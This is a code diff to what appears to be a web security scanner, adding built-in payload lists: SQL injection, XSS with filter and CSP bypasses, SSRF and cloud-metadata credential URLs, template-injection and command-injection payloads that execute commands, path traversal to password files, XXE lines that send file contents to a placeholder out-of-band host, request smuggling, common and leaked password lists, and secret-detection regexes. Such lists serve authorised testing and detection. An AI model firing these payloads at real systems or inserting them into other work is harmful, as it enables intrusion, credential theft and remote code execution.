@@ -700,6 +700,525 @@ static const char* kHeadersSec =
     "Access-Control-Max-Age\n"
     ;
 
+static const char* kSqliErrorBased =
+    "'\n"
+    "\"\n"
+    "`\n"
+    "' OR '1'='1\n"
+    "\" OR \"1\"=\"1\n"
+    "' OR 1=1--\n"
+    "' OR 1=1#\n"
+    "' OR 1=1/*\n"
+    "' AND extractvalue(1, concat(0x7e, version()))-- -\n"
+    "' AND updatexml(1, concat(0x7e, version(), 0x7e), 1)-- -\n"
+    "' AND 1=CONVERT(int,@@version)--\n"
+    "' AND CAST((SELECT @@version) AS int)--\n"
+    "1' AND extractvalue(rand(),concat(0x3a,(SELECT user())))-- -\n"
+    "1 AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))\n"
+    "1' AND 1=cast(version() as integer)--\n"
+    "1' AND 1=cast((SELECT current_database()) as integer)--\n"
+    "1' AND 1=CAST(sqlite_version() AS INTEGER)--\n"
+    "'))\n"
+    "')))\n"
+    ;
+
+static const char* kSqliBooleanTrue =
+    "' AND '1'='1\n"
+    "1 AND 1=1\n"
+    "' OR 'a'='a' --\n"
+    "1) AND 1=1--\n"
+    "1)) AND 1=1--\n"
+    "' AND LENGTH(database())>0--\n"
+    "' AND ASCII(SUBSTRING(@@version,1,1))>0--\n"
+    "' AND EXISTS(SELECT 1)--\n"
+    "' OR NOT '1'='2\n"
+    "1 AND (SELECT COUNT(*) FROM information_schema.tables)>=0--\n"
+    "1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--\n"
+    ;
+
+static const char* kSqliBooleanFalse =
+    "' AND '1'='2\n"
+    "1 AND 1=2\n"
+    "' OR 'a'='b' --\n"
+    "1) AND 1=2--\n"
+    "1)) AND 1=2--\n"
+    "' AND LENGTH(database())<0--\n"
+    "' AND ASCII(SUBSTRING(@@version,1,1))<0--\n"
+    "' AND NOT EXISTS(SELECT 1)--\n"
+    "' AND 'a'='b\n"
+    "1 AND (SELECT COUNT(*) FROM information_schema.tables)<0--\n"
+    "1 AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1--\n"
+    ;
+
+static const char* kSqliUnionBased =
+    "' UNION SELECT NULL--\n"
+    "' UNION SELECT NULL,NULL--\n"
+    "' UNION SELECT NULL,NULL,NULL--\n"
+    "' UNION ALL SELECT NULL,NULL,NULL--\n"
+    "1 UNION SELECT NULL--\n"
+    "1 UNION SELECT NULL,NULL--\n"
+    "1 UNION SELECT NULL,NULL,NULL--\n"
+    "' UNION SELECT @@version,NULL--\n"
+    "' UNION SELECT version(),NULL--\n"
+    "' UNION SELECT sqlite_version(),NULL--\n"
+    "' UNION SELECT banner,NULL FROM v$version--\n"
+    "' UNION SELECT table_name,NULL FROM information_schema.tables--\n"
+    "' UNION SELECT column_name,NULL FROM information_schema.columns--\n"
+    "' ORDER BY 1--\n"
+    "' ORDER BY 2--\n"
+    "' ORDER BY 3--\n"
+    ;
+
+static const char* kSqliTimeBased =
+    "' AND SLEEP(5)-- -\n"
+    "' OR SLEEP(5)-- -\n"
+    "'; SELECT SLEEP(5)-- -\n"
+    "1 AND IF(1=1, SLEEP(5), 0)-- -\n"
+    "1; SELECT pg_sleep(5)--\n"
+    "1 AND pg_sleep(5)--\n"
+    "1'; WAITFOR DELAY '0:0:5'--\n"
+    "1; WAITFOR DELAY '0:0:5'--\n"
+    "1' AND BENCHMARK(5000000,MD5('a'))-- -\n"
+    "1' AND dbms_pipe.receive_message(('a'),5)-- -\n"
+    "1' AND randomblob(500000000)--\n"
+    ;
+
+static const char* kSqliWafBypass =
+    "/**/OR/**/1=1--\n"
+    "'/**/OR/**/'1'='1\n"
+    "'%09OR%091=1--\n"
+    "'%0aOR%0a1=1--\n"
+    "'/*!50000OR*/1=1--\n"
+    "' oR '1'='1\n"
+    "'%23%0aOR%0a1=1\n"
+    "'||(SELECT 1)--\n"
+    "' OR 'x' LIKE 'x\n"
+    "' UNION/**/SELECT/**/NULL,NULL--\n"
+    "'%55nion%20%53elect%20NULL--\n"
+    "1 AND/**/IF(1=1,SLEEP(5),0)--\n"
+    ;
+
+static const char* kSqliDbFingerprint =
+    "@@version\n"
+    "version()\n"
+    "sqlite_version()\n"
+    "banner FROM v$version\n"
+    "db_name()\n"
+    "current_database()\n"
+    "database()\n"
+    "user()\n"
+    "current_user\n"
+    "information_schema.tables\n"
+    "pg_catalog.pg_tables\n"
+    "sys.databases\n"
+    "all_tables\n"
+    "sqlite_master\n"
+    ;
+
+static const char* kXssHtmlContext =
+    "<svg onload=alert(1)>\n"
+    "<img src=x onerror=alert(1)>\n"
+    "<details open ontoggle=alert(1)>\n"
+    "<marquee onstart=alert(1)>\n"
+    "<video><source onerror=alert(1)>\n"
+    "<math><mtext><table><mglyph><svg><mtext><textarea><img src=x onerror=alert(1)>\n"
+    "</title><svg/onload=alert(1)>\n"
+    "</textarea><svg/onload=alert(1)>\n"
+    "</style><svg/onload=alert(1)>\n"
+    "<iframe srcdoc=\"<svg onload=alert(1)>\"></iframe>\n"
+    ;
+
+static const char* kXssAttributeContext =
+    "\" autofocus onfocus=alert(1) x=\"\n"
+    "' autofocus onfocus=alert(1) x='\n"
+    "\" onmouseover=alert(1) x=\"\n"
+    "' onmouseover=alert(1) x='\n"
+    "\" onerror=alert(1) src=x x=\"\n"
+    "' onerror=alert(1) src=x x='\n"
+    "\" formaction=javascript:alert(1) x=\"\n"
+    "' formaction=javascript:alert(1) x='\n"
+    "\" style=animation-name:rotation onanimationstart=alert(1) x=\"\n"
+    "\" accesskey=x onclick=alert(1) x=\"\n"
+    ;
+
+static const char* kXssScriptContext =
+    "';alert(1);//\n"
+    "\";alert(1);//\n"
+    "`;alert(1);//\n"
+    "</script><script>alert(1)</script>\n"
+    "\\'-alert(1)-\\'\n"
+    "\\\"-alert(1)-\\\"\n"
+    "${alert(1)}\n"
+    "${constructor.constructor('alert(1)')()}\n"
+    "');Function('alert(1)')();//\n"
+    "\");setTimeout('alert(1)',0);//\n"
+    ;
+
+static const char* kXssUrlContext =
+    "javascript:alert(1)\n"
+    "javascript://%0aalert(1)\n"
+    "data:text/html,<script>alert(1)</script>\n"
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n"
+    "JaVaScRiPt:alert(1)\n"
+    "javascript:eval('alert(1)')\n"
+    "javascript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//\n"
+    "//example.invalid/%0d%0aLocation:%20javascript:alert(1)\n"
+    ;
+
+static const char* kXssPolyglotExpanded =
+    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(1)//'>\n"
+    "\"><svg/onload=alert(1)//\n"
+    "'><svg/onload=alert(1)//\n"
+    "</title></style></textarea><svg/onload=alert(1)>\n"
+    "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><img src=x onerror=alert(1)>\">\n"
+    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>\n"
+    "<svg><set onbegin=alert(1) attributeName=x to=y>\n"
+    "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script>\n"
+    "<x onclick=alert(1) onkeydown=alert(1) onmouseover=alert(1)>x</x>\n"
+    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">\n"
+    ;
+
+static const char* kXssCspBypass =
+    "<script nonce=AIDA_MARKER>alert(1)</script>\n"
+    "<script src=//example.invalid/aida.js></script>\n"
+    "<link rel=preload as=script href=//example.invalid/aida.js onload=alert(1)>\n"
+    "<object data=data:text/html,<script>alert(1)</script>>\n"
+    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>\n"
+    "<base href=javascript:alert(1);//><a href=/x>click</a>\n"
+    "<form action=javascript:alert(1)><button>go</button></form>\n"
+    "<meta http-equiv=refresh content=\"0;javascript:alert(1)\">\n"
+    ;
+
+static const char* kXssWafBypass =
+    "<svg/onload=alert`1`>\n"
+    "<img src=x onerror=confirm?.(1)>\n"
+    "<img src=x onerror=window['al'+'ert'](1)>\n"
+    "<script>top['al'+'ert'](1)</script>\n"
+    "<scr<script>ipt>alert(1)</scr</script>ipt>\n"
+    "%3Csvg%2Fonload%3Dalert(1)%3E\n"
+    "&lt;svg/onload=alert(1)&gt;\n"
+    "<svg><script>123<a>alert(1)</script></svg>\n"
+    "<iframe src=java&#x09;script:alert(1)>\n"
+    "<IMG SRC=jav&#x0A;ascript:alert(1)>\n"
+    ;
+
+static const char* kAuthUsernamesCommonExpanded =
+    "admin\nadministrator\nroot\nuser\ntest\nguest\nsupport\nservice\noperator\nmanager\nweb\nwww\napp\napi\ndev\ndeveloper\nqa\nstaging\nprod\nproduction\nbackup\nsysadmin\nsuperadmin\nsecurity\nhelpdesk\nbilling\nsales\nfinance\nhr\nlegal\nops\ndevops\nsre\ndba\ndatabase\noracle\npostgres\nmysql\nmssql\nredis\nmongo\nelastic\njenkins\ngitlab\njira\nconfluence\nokta\nauth0\nvpn\nfirewall\nrouter\nswitch\nprinter\nscanner\npos\nkiosk\nmobile\nandroid\nios\ncustomer\nclient\npartner\nvendor\nemployee\ncontractor\nintern\ntemp\nvisitor\nanonymous\npublic\nshared\nbreakglass\nemergency\nsetup\ninstaller\n"
+    "admin@example.com\nadministrator@example.com\nroot@example.com\nsupport@example.com\nservice@example.com\nsecurity@example.com\nhelpdesk@example.com\nsales@example.com\nfinance@example.com\nhr@example.com\nit@example.com\nops@example.com\ndevops@example.com\nsre@example.com\nwebmaster@example.com\npostmaster@example.com\nhostmaster@example.com\n"
+    ;
+
+static const char* kAuthPasswordsCommonExpanded =
+    "password\nPassword1\nPassword123\nP@ssw0rd\nP@ssw0rd1\nP@ssw0rd!\nadmin\nadmin123\nadmin@123\nroot\nroot123\nuser\nuser123\ntest\ntest123\nguest\nguest123\nwelcome\nWelcome1\nWelcome123\nchangeme\nchangeit\ndefault\nletmein\nqwerty\nqwerty123\nabc123\n123456\n12345678\n123456789\n1234567890\n111111\n000000\niloveyou\nmonkey\ndragon\nmaster\nsunshine\nfootball\nbaseball\ntrustno1\ncompany123\nCompany123\nCompany2024\nSpring2024\nSummer2024\nWinter2024\nAutumn2024\nFall2024\n"
+    "oracle\noracle123\nmysql\nmysql123\npostgres\npostgres123\nsqlserver\nsqlserver123\nredis\nredis123\nmongodb\nmongodb123\njenkins\njenkins123\ngitlab\ngitlab123\njira\njira123\nconfluence\nconfluence123\nvpn\nvpn123\nfirewall\nfirewall123\nrouter\nrouter123\nswitch\nswitch123\nbackup\nbackup123\n"
+    ;
+
+static const char* kAuthPasswordsRockyou =
+    "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n123123\nfootball\nsecret\nandrea\ncarlos\njennifer\njoshua\nbubbles\n1234567890\nsuperman\nhannah\namanda\nloveyou\npretty\nbasketball\nandrew\nangels\ntweety\nflower\nplayboy\nhello\nelizabeth\nhottie\ntinkerbell\ncharlie\nsamantha\nbarbie\nchelsea\nlovers\nteamo\njasmine\nbrandon\n666666\nshadow\nmelissa\neminem\nmatthew\nrobert\ndanielle\nforever\nfamily\njonathan\n987654321\ncomputer\nwhatever\ndragon\nvanessa\ncookie\nnaruto\nsummer\nsweety\nspongebob\njoseph\njunior\nsoftball\ntaylor\nyellow\ndaniela\nlauren\nmickey\nprincesa\nalexandra\nalexis\njesus\nestrella\nmiguel\nwilliam\nthomas\nbeautiful\nmylove\nangela\npoohbear\npatrick\niloveme\nsakura\nadrian\nalexander\ndestiny\nchristian\n121212\nsayang\namerica\ndancer\nmonica\nrichard\n112233\nprincess1\n555555\n"
+    ;
+
+static const char* kSsrfInternalUrls =
+    "http://localhost/\n"
+    "http://127.0.0.1/\n"
+    "http://127.1/\n"
+    "http://0/\n"
+    "http://0.0.0.0/\n"
+    "http://[::1]/\n"
+    "http://2130706433/\n"
+    "http://0x7f000001/\n"
+    "http://0177.0.0.1/\n"
+    "http://127.0.0.1:22/\n"
+    "http://127.0.0.1:80/\n"
+    "http://127.0.0.1:443/\n"
+    "http://127.0.0.1:3306/\n"
+    "http://127.0.0.1:5432/\n"
+    "http://127.0.0.1:6379/\n"
+    "http://127.0.0.1:9200/\n"
+    "http://127.0.0.1:11211/\n"
+    "http://127.0.0.1:27017/\n"
+    "http://10.0.0.1/\n"
+    "http://10.10.10.10/\n"
+    "http://172.16.0.1/\n"
+    "http://192.168.0.1/\n"
+    "http://192.168.1.1/\n"
+    "http://169.254.169.254/\n"
+    "gopher://127.0.0.1:6379/_INFO\n"
+    "dict://127.0.0.1:11211/stats\n"
+    "file:///etc/passwd\n"
+    "file:///c:/windows/win.ini\n"
+    ;
+
+static const char* kSsrfCloudMetadataExpanded =
+    "http://169.254.169.254/latest/meta-data/\n"
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
+    "http://169.254.169.254/latest/user-data/\n"
+    "http://169.254.169.254/latest/dynamic/instance-identity/document\n"
+    "http://169.254.170.2/v2/credentials/\n"
+    "http://metadata.google.internal/computeMetadata/v1/\n"
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n"
+    "http://metadata/computeMetadata/v1/instance/service-accounts/default/token\n"
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
+    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n"
+    "http://100.100.100.200/latest/meta-data/\n"
+    "http://169.254.169.254/opc/v1/instance/\n"
+    "http://169.254.169.254/openstack/latest/meta_data.json\n"
+    "http://169.254.169.254/metadata/v1/id\n"
+    "http://192.0.0.192/latest/meta-data/\n"
+    "http://[::ffff:169.254.169.254]/latest/meta-data/\n"
+    "http://2852039166/latest/meta-data/\n"
+    "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/\n"
+    "http://169.254.169.254.nip.io/latest/meta-data/\n"
+    ;
+
+static const char* kSstiJinja2 =
+    "{{7*7}}\n"
+    "{{7*'7'}}\n"
+    "{{config}}\n"
+    "{{config.items()}}\n"
+    "{{request}}\n"
+    "{{self}}\n"
+    "{{cycler.__init__.__globals__.os.popen('id').read()}}\n"
+    "{{joiner.__init__.__globals__.os.popen('id').read()}}\n"
+    "{{namespace.__init__.__globals__.os.popen('id').read()}}\n"
+    "{{''.__class__.__mro__[1].__subclasses__()}}\n"
+    ;
+
+static const char* kSstiTwig =
+    "{{7*7}}\n"
+    "{{7*'7'}}\n"
+    "{{_self}}\n"
+    "{{app.request}}\n"
+    "{{['id']|filter('system')}}\n"
+    "{{['cat /etc/passwd']|filter('system')}}\n"
+    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n"
+    ;
+
+static const char* kSstiFreemarker =
+    "${7*7}\n"
+    "${7*'7'}\n"
+    "${.version}\n"
+    "${product.getClass()}\n"
+    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n"
+    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
+    "${object.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}\n"
+    ;
+
+static const char* kSstiVelocity =
+    "#set($x=7*7)$x\n"
+    "#set($e=\"\")$e.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")\n"
+    "#foreach($i in [1..3])$i#end\n"
+    "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")\n"
+    "${7*7}\n"
+    ;
+
+static const char* kSstiSmarty =
+    "{7*7}\n"
+    "{$smarty.version}\n"
+    "{php}echo `id`;{/php}\n"
+    "{if phpinfo()}{/if}\n"
+    "{system('id')}\n"
+    "{fetch file='/etc/passwd'}\n"
+    ;
+
+static const char* kSstiDetect =
+    "{{7*7}}\n"
+    "${7*7}\n"
+    "#{7*7}\n"
+    "*{7*7}\n"
+    "{7*7}\n"
+    "<%= 7*7 %>\n"
+    "{{=7*7}}\n"
+    "@{7*7}\n"
+    "[[${7*7}]]\n"
+    "[(${7*7})]\n"
+    ;
+
+static const char* kCmdiUnixAdvanced =
+    "; id\n"
+    "| id\n"
+    "&& id\n"
+    "|| id\n"
+    "`id`\n"
+    "$(id)\n"
+    "%0aid\n"
+    "%0a/bin/sh -c id\n"
+    ";${IFS}id\n"
+    "{cat,/etc/passwd}\n"
+    "/???/c?t /etc/passwd\n"
+    "; sleep 5\n"
+    "| sleep 5\n"
+    "$(sleep 5)\n"
+    "; ping -c 5 127.0.0.1\n"
+    ;
+
+static const char* kCmdiWindowsAdvanced =
+    "& whoami\n"
+    "&& whoami\n"
+    "| whoami\n"
+    "|| whoami\n"
+    "%0d%0a whoami\n"
+    "& cmd /c whoami\n"
+    "& cmd.exe /c whoami\n"
+    "& powershell -NoProfile -Command whoami\n"
+    "& powershell -enc dwBoAG8AYQBtAGkA\n"
+    "& type c:\\windows\\win.ini\n"
+    "& ping -n 5 127.0.0.1\n"
+    "& timeout /t 5\n"
+    "& choice /d y /t 5 > nul\n"
+    ;
+
+static const char* kCmdiFilterBypass =
+    "%0aid\n"
+    "%0d%0aid\n"
+    "%26%26id\n"
+    "%7Cid\n"
+    "%3Bid\n"
+    "i\\d\n"
+    "i${IFS}d\n"
+    "w'h'o'a'm'i\n"
+    "w\"h\"o\"a\"m\"i\n"
+    "who^ami\n"
+    "wh^oami\n"
+    "cmd,/c,whoami\n"
+    "{echo,AIDA_CMDI}\n"
+    "`echo AIDA_CMDI`\n"
+    "$(echo AIDA_CMDI)\n"
+    ;
+
+static const char* kPathTraversalUnixAdvanced =
+    "/etc/passwd\n"
+    "../etc/passwd\n"
+    "../../etc/passwd\n"
+    "../../../etc/passwd\n"
+    "../../../../etc/passwd\n"
+    "../../../../../../etc/passwd\n"
+    "../../../../../../../../etc/passwd\n"
+    "/proc/self/environ\n"
+    "/proc/self/cmdline\n"
+    "/proc/self/status\n"
+    "/proc/version\n"
+    "/var/log/auth.log\n"
+    "/var/log/nginx/access.log\n"
+    "/var/log/apache2/access.log\n"
+    "php://filter/convert.base64-encode/resource=/etc/passwd\n"
+    "php://filter/read=convert.base64-encode/resource=index.php\n"
+    "file:///etc/passwd\n"
+    ;
+
+static const char* kPathTraversalWindowsAdvanced =
+    "C:\\windows\\win.ini\n"
+    "C:\\boot.ini\n"
+    "..\\windows\\win.ini\n"
+    "..\\..\\windows\\win.ini\n"
+    "..\\..\\..\\windows\\win.ini\n"
+    "..\\..\\..\\..\\windows\\win.ini\n"
+    "..\\..\\..\\..\\..\\windows\\win.ini\n"
+    "C:\\windows\\system32\\drivers\\etc\\hosts\n"
+    "C:\\windows\\repair\\sam\n"
+    "C:\\windows\\system.ini\n"
+    "C:\\windows\\panther\\unattend.xml\n"
+    "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_extend.log\n"
+    "C:\\windows\\system32\\inetsrv\\config\\applicationHost.config\n"
+    ;
+
+static const char* kPathTraversalEncodingBypass =
+    "..%2f..%2f..%2fetc%2fpasswd\n"
+    "..%252f..%252f..%252fetc%252fpasswd\n"
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd\n"
+    "....//....//....//etc/passwd\n"
+    "....\\/....\\/....\\/etc/passwd\n"
+    "..%c0%af..%c0%afetc%c0%afpasswd\n"
+    "..%5c..%5c..%5cwindows%5cwin.ini\n"
+    "..%255c..%255c..%255cwindows%255cwin.ini\n"
+    "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini\n"
+    "/etc/passwd%00\n"
+    "C:\\windows\\win.ini%00\n"
+    ;
+
+static const char* kXxeOob =
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY % dtd SYSTEM \"http://AIDA_OOB/aida.dtd\">%dtd;]><root>aida</root>\n"
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://AIDA_OOB/xxe\">]><root>&xxe;</root>\n"
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://AIDA_OOB/?x=%file;\">%dtd;]><root>aida</root>\n"
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY % file SYSTEM \"file:///c:/windows/win.ini\"><!ENTITY % dtd SYSTEM \"http://AIDA_OOB/?x=%file;\">%dtd;]><root>aida</root>\n"
+    ;
+
+static const char* kXxeErrorBased =
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>\n"
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>\n"
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><root>aida</root>\n"
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>\n"
+    ;
+
+static const char* kXxeSsrf =
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>\n"
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><root>&xxe;</root>\n"
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><root>&xxe;</root>\n"
+    "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://localhost:8080/\">]><root>&xxe;</root>\n"
+    ;
+
+static const char* kSmugglingClTe =
+    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG\n"
+    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX\n"
+    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 11\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /x\n"
+    ;
+
+static const char* kSmugglingTeCl =
+    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5\\r\\nGHOST\\r\\n0\\r\\n\\r\\n\n"
+    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\n0\\r\\n\\r\\n\n"
+    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nContent-Length: 0\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nX\\r\\n0\\r\\n\\r\\n\n"
+    ;
+
+static const char* kSmugglingTeTe =
+    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding : chunked\\r\\nContent-Length: 4\\r\\n\\r\\n5\\r\\nGHOST\\r\\n0\\r\\n\\r\\n\n"
+    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: xchunked\\r\\nContent-Length: 4\\r\\n\\r\\n0\\r\\n\\r\\nG\n"
+    "POST / HTTP/1.1\\r\\nHost: AIDA_HOST\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding:\\tchunked\\r\\nContent-Length: 4\\r\\n\\r\\n0\\r\\n\\r\\nG\n"
+    ;
+
+static const char* kFuzzCommonParams =
+    "debug\ntest\nadmin\nrole\nisAdmin\nis_admin\nuser\nusername\nid\nuser_id\naccount_id\ntenant_id\norg_id\ncustomer_id\nsession\nsession_id\ntoken\naccess_token\nauth_token\napi_key\napikey\nkey\nsecret\npassword\npasswd\npwd\nredirect\nredirect_uri\nreturn_url\nnext\nurl\nuri\npath\nfile\nfilename\ndownload\ninclude\ncallback\njsonp\nformat\nfields\nexpand\nfilter\nsort\norder\nlimit\noffset\npage\nsize\nlang\nlocale\ncountry\ncurrency\npreview\ndraft\npublished\nprivate\npublic\ninternal\nexternal\nscope\npermission\npermissions\nfeature\nbeta\nexperiment\nconfig\nmode\nview\ntemplate\ntheme\n"
+    ;
+
+static const char* kFuzzCommonHeaders =
+    "X-Forwarded-For\nX-Forwarded-Host\nX-Forwarded-Proto\nX-Original-URL\nX-Rewrite-URL\nX-Forwarded-Server\nX-Host\nX-Real-IP\nForwarded\nClient-IP\nTrue-Client-IP\nX-Client-IP\nX-Remote-IP\nX-Remote-Addr\nX-ProxyUser-Ip\nX-Originating-IP\nX-Cluster-Client-IP\nX-HTTP-Method-Override\nX-Method-Override\nX-Original-Method\nX-Api-Version\nX-Version\nX-Debug\nX-Admin\nX-Internal\nX-Requested-With\nOrigin\nReferer\nHost\nAccept\nAccept-Language\nAccept-Encoding\nContent-Type\nAuthorization\nCookie\n"
+    ;
+
+static const char* kFuzzContentTypes =
+    "application/json\napplication/x-www-form-urlencoded\nmultipart/form-data\ntext/plain\ntext/xml\napplication/xml\napplication/graphql\napplication/graphql+json\napplication/x-ndjson\napplication/json-patch+json\napplication/merge-patch+json\napplication/octet-stream\ntext/html\ntext/javascript\napplication/javascript\napplication/yaml\napplication/x-yaml\n"
+    ;
+
+static const char* kGraphqlFields =
+    "__typename\n__schema\n__type\nid\nnode\nnodes\nedges\npageInfo\nuser\nusers\nviewer\nme\naccount\naccounts\norganization\norganizations\ntenant\ntenants\nadmin\nadmins\nrole\nroles\npermission\npermissions\ntoken\ntokens\napiKey\napiKeys\nsecret\nsecrets\npassword\nemail\nprofile\nsettings\nconfig\nmetadata\ncreatedAt\nupdatedAt\ndeletedAt\nowner\nbalance\namount\nprice\norder\norders\ninvoice\ninvoices\npayment\npayments\n"
+    ;
+
+static const char* kGraphqlOperations =
+    "query { __typename }\n"
+    "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind } } }\n"
+    "query AiDAType($name:String!) { __type(name:$name) { name kind fields { name type { name kind ofType { name kind } } args { name type { name kind ofType { name kind } } } } } }\n"
+    "query AiDANode($id:ID!) { node(id:$id) { id __typename } }\n"
+    "query AiDAViewer { viewer { id __typename } }\n"
+    "mutation AiDAProbe($aidaValue:String) { __typename }\n"
+    "query AiDADepth { __typename }\n"
+    ;
+
+static const char* kIdorIdPatterns =
+    "1\n2\n3\n4\n5\n10\n11\n12\n99\n100\n101\n999\n1000\n1001\n1234\n12345\n123456\n0001\n0002\n0003\n00000001\n00000002\n-1\n0\n01\n02\n10\nff\nffffffff\n00000000-0000-0000-0000-000000000000\n11111111-1111-1111-1111-111111111111\n550e8400-e29b-41d4-a716-446655440000\n../1\n..%2f1\n%2e%2e%2f1\nadmin\nroot\nme\nself\ncurrent\nlatest\n"
+    ;
+
+static const char* kJsSecretsPatterns =
+    "(?i)(api[_-]?key|apikey|secret|token|password|passwd|pwd)\\s*[:=]\\s*['\\\"][A-Za-z0-9._~+/=-]{12,}['\\\"]\n"
+    "AKIA[0-9A-Z]{16}\n"
+    "ASIA[0-9A-Z]{16}\n"
+    "ghp_[A-Za-z0-9_]{36,}\n"
+    "github_pat_[A-Za-z0-9_]{80,}\n"
+    "glpat-[A-Za-z0-9_-]{20,}\n"
+    "xox[baprs]-[A-Za-z0-9-]{10,}\n"
+    "sk_live_[A-Za-z0-9]{20,}\n"
+    "sk_test_[A-Za-z0-9]{20,}\n"
+    "AIza[0-9A-Za-z_-]{35}\n"
+    "ya29\\.[0-9A-Za-z_-]{40,}\n"
+    "eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\n"
+    "-----BEGIN [A-Z ]*PRIVATE KEY-----\n"
+    ;
+
 struct builtin_def_t
 {
     const char* id;
@@ -732,6 +1251,54 @@ static const builtin_def_t kBuiltins[] = {
     { "subdomains/top1000", "Subdomains - Top", "Top subdomain labels for brute-force enumeration.", kSubdomainsTop1000 },
     { "fuzzdb/extensions", "File Extensions", "File extensions for content-discovery extension mode.", kFuzzdbExtensions },
     { "headers/security-headers", "HTTP Security Headers", "Names of security-related HTTP response headers.", kHeadersSec },
+    { "sqli/error_based", "SQLi Error-Based Expanded", "Expanded SQL error trigger payloads used by offensive SQLi workflows.", kSqliErrorBased },
+    { "sqli/boolean_true", "SQLi Boolean True", "Boolean-blind true-side SQL injection payloads.", kSqliBooleanTrue },
+    { "sqli/boolean_false", "SQLi Boolean False", "Boolean-blind false-side SQL injection payloads.", kSqliBooleanFalse },
+    { "sqli/union_based", "SQLi Union-Based", "UNION and ORDER BY discovery payloads for column-count and data extraction probes.", kSqliUnionBased },
+    { "sqli/time_based", "SQLi Time-Based Expanded", "Time-delay SQL injection payloads across MySQL, PostgreSQL, SQL Server, Oracle, and SQLite.", kSqliTimeBased },
+    { "sqli/waf_bypass", "SQLi WAF Bypass", "Encoding, casing, comments, and operator variants for SQLi filter bypass testing.", kSqliWafBypass },
+    { "sqli/db_fingerprint", "SQLi DB Fingerprint", "Database metadata expressions for backend fingerprinting through confirmed SQLi.", kSqliDbFingerprint },
+    { "xss/html_context", "XSS HTML Context", "HTML body-context XSS payloads.", kXssHtmlContext },
